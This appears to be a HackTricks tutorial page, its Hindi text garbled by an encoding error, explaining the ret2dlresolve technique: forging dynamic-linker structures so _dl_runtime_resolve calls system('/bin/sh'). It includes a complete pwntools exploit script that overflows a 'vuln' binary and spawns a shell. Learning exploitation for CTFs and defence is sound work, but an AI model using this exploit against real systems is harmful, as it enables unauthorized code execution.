# Ret2dlresolve

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рдФрд░ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдореВрд▓рднреВрдд рдЬрд╛рдирдХрд╛рд░реА

[**GOT/PLT**](../arbitrary-write-2-exec/aw2exec-got-plt.md) рдФрд░ [**Relro**](../common-binary-protections-and-bypasses/relro.md) рдХреЗ рдкреЗрдЬ рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ Full Relro рдХреЗ рдмрд┐рдирд░реА рд╕рд┐рдореНрдмреЛрд▓реНрд╕ рдХреЛ (рдЬреИрд╕реЗ рдмрд╛рд╣рд░реА рдкреБрд╕реНрддрдХрд╛рд▓рдпреЛрдВ рдХреЗ рдкрддреЗ) рдкрд╣рд▓реА рдмрд╛рд░ рдЙрдиреНрд╣реЗрдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рд╣рд▓ рдХрд░ рджреЗрдЧрд╛ред рдпрд╣ рд╕рдорд╛рдзрд╛рди **`_dl_runtime_resolve`** рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдмреБрд▓рд╛рдХрд░ рд╣реЛрддрд╛ рд╣реИред

**`_dl_runtime_resolve`** рдлрд╝рдВрдХреНрд╢рди рд╕реНрдЯреИрдХ рд╕реЗ рдХреБрдЫ рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЛ рд▓реЗрддрд╛ рд╣реИ рдЬрд┐рдирдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рддрд╛рдХрд┐ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рд┐рдореНрдмреЛрд▓ рдХреЛ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

рдЗрд╕рд▓рд┐рдП, рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ **рд╕рднреА рдЗрди рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЛ рдирдХрд▓реА рдмрдирд╛рдпрд╛ рдЬрд╛рдП** рддрд╛рдХрд┐ рдбрд╛рдпрдирд╛рдорд┐рдХ рд▓рд┐рдВрдХ рдХрд┐рдП рдЧрдП рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕рд┐рдореНрдмреЛрд▓ (рдЬреИрд╕реЗ **`system`** рдлрд╝рдВрдХреНрд╢рди) рдХреЛ рд╣рд▓ рдХрд░реЗрдВ рдФрд░ рдЗрд╕реЗ рдПрдХ рд╡рд┐рдиреНрдпрд╛рд╕рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **`system('/bin/sh')`**) рдХреЗ рд╕рд╛рде рдмреБрд▓рд╛рдПрдВред

рд╕рд╛рдорд╛рдиреНрдпрдд: рдпрджрд┐ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рд▓рд┐рдП рд╕рд┐рд╕реНрдЯреЙрд▓ рдЧреИрдЬреЗрдЯреНрд╕ рдирд╣реАрдВ рд╣реИрдВ (рдЬреИрд╕реЗ [**ret2syscall**](rop-syscall-execv.md) рдпрд╛ [SROP](srop-sigreturn-oriented-programming.md) рдЬреИрд╕реА рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП) рдФрд░ libc рдкрддреЛрдВ рдХреЛ рд▓реАрдХ рдХрд░рдиреЗ рдХреЗ рддрд░реАрдХреЗ рдирд╣реАрдВ рд╣реИрдВ рддреЛ рдпрд╣ рддрдХрдиреАрдХ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧреА рд╣реИред

рдЖрдк рдЗрд╕ рддрдХрдиреАрдХ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рдмреЗрд╣рддрд░ рд╡реНрдпрд╛рдЦреНрдпрд╛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рд╡реАрдбрд┐рдпреЛ рдХреЗ рджреВрд╕рд░реЗ рд╣рд┐рд╕реНрд╕реЗ рдореЗрдВ:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## рд╕рдВрд░рдЪрдирд╛рдПрдВ

3 рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЛ рдирдХрд▓реА рдмрдирд╛рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ: **`JMPREL`**, **`STRTAB`** рдФрд░ **`SYMTAB`**ред рдЖрдкрдХреЛ рдпрд╣рд╛рдВ рдЗрдирдХрд╛ рдХреИрд╕реЗ рдирд┐рд░реНрдорд┐рдд рд╣реЛрддрд╛ рд╣реИ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рдмреЗрд╣рддрд░ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдорд┐рд▓реЗрдЧреА [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve#structures)

## рд╣рдорд▓реЗ рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢

1. рдХрд┐рд╕реА рд╕реНрдерд╛рди рдкрд░ рдирдХрд▓реА рд╕рдВрд░рдЪрдирд╛рдПрдВ рд▓рд┐рдЦреЗрдВ
2. рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдкрд╣рд▓рд╛ рддрд░реНрдХ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдВ (`$rdi = &'/bin/sh'`)
3. рд╕реНрдЯреИрдХ рдкрд░ рд╕рдВрд░рдЪрдирд╛рдУрдВ рдХреЗ рдкрддреЗ рд╕реЗрдЯ рдХрд░реЗрдВ рддрд╛рдХрд┐ **`_dl_runtime_resolve`** рдХреЛ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗ
4. **`_dl_runtime_resolve`** рдХреЛ **рдХреЙрд▓** рдХрд░реЗрдВ
5. **`system`** рдХреЛ `'/bin/sh'` рдХреЗ рд╕рд╛рде рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛

## рдЙрджрд╛рд╣рд░рдг

рдЖрдк рдПрдХ [**рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдпрд╣рд╛рдВ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation) **рдЬрд┐рд╕рдореЗрдВ рдЕрдВрддрд┐рдо ROP рд╢реНрд░реГрдВрдЦрд▓рд╛ рдХрд╛ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛рди рд╣реИ**, рд▓реЗрдХрд┐рди рдпрд╣рд╛рдВ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдЕрдВрддрд┐рдо рдЙрддреНрдкреАрдбрд╝рди рдпрд╣рд╛рдВ рд╣реИ:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = elf.process()
rop = ROP(elf)

# create the dlresolve object
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

rop.raw('A' * 76)
rop.read(0, dlresolve.data_addr) # read to where we want to write the fake structures
rop.ret2dlresolve(dlresolve)     # call .plt and dl-resolve() with the correct, calculated reloc_offset

log.info(rop.dump())

p.sendline(rop.chain())
p.sendline(dlresolve.payload)    # now the read is called and we pass all the relevant structures in

p.interactive()
```
## рд╕рдВрджрд░реНрдн

* [https://youtu.be/ADULSwnQs-s](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣ **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
